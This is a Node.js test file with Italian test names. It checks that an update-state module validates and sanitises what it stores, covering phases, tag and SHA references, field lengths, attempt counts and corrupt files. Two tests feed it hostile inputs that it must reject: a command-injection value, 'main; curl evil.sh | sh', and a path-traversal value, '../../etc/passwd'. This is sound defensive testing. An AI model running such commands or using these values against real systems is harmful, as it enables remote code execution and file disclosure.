import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { Phase, readState, writeState, stateFile } from '../src/features/updates/update_state.js';

function sandbox() {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'argus-update-'));
    return { dataDir };
}

test('senza file lo stato e inattivo', () => {
    const config = sandbox();
    assert.equal(readState(config).phase, Phase.IDLE);
    assert.equal(readState(config).targetRef, null);
});

test('scrive e rilegge una richiesta di aggiornamento', () => {
    const config = sandbox();
    const head = 'a'.repeat(40);

    writeState(config, { phase: Phase.REQUESTED, targetRef: 'v0.5.0', previousRef: head, previousVersion: '0.4.0' });

    const state = readState(config);
    assert.equal(state.phase, Phase.REQUESTED);
    assert.equal(state.targetRef, 'v0.5.0');
    assert.equal(state.previousRef, head);
    assert.equal(state.previousVersion, '0.4.0');
});

test('scarta un riferimento non conforme al formato dei tag', () => {
    const config = sandbox();
    writeState(config, { phase: Phase.REQUESTED, targetRef: 'main; curl evil.sh | sh' });
    assert.equal(readState(config).targetRef, null);
});

test('scarta un commit precedente che non e un SHA', () => {
    const config = sandbox();
    writeState(config, { previousRef: '../../etc/passwd' });
    assert.equal(readState(config).previousRef, null);
});

test('scarta una fase inventata', () => {
    const config = sandbox();
    writeState(config, { phase: 'root' });
    assert.equal(readState(config).phase, Phase.IDLE);
});

test('un file corrotto non fa esplodere la lettura', () => {
    const config = sandbox();
    fs.writeFileSync(stateFile(config), '{ questo non e json');
    assert.equal(readState(config).phase, Phase.IDLE);
});

test('limita i campi di lunghezza arbitraria', () => {
    const config = sandbox();
    writeState(config, { message: 'x'.repeat(5000), previousVersion: 'y'.repeat(500) });

    const state = readState(config);
    assert.equal(state.message.length, 500);
    assert.equal(state.previousVersion.length, 32);
});

test('i tentativi restano interi non negativi e limitati', () => {
    const config = sandbox();

    writeState(config, { attempts: -5 });
    assert.equal(readState(config).attempts, 0);

    writeState(config, { attempts: 4000 });
    assert.equal(readState(config).attempts, 99);
});

test('la scrittura non lascia file temporanei', () => {
    const config = sandbox();
    writeState(config, { phase: Phase.PENDING, attempts: 1 });

    const leftovers = fs.readdirSync(config.dataDir).filter((name) => name.endsWith('.tmp'));
    assert.deepEqual(leftovers, []);
});
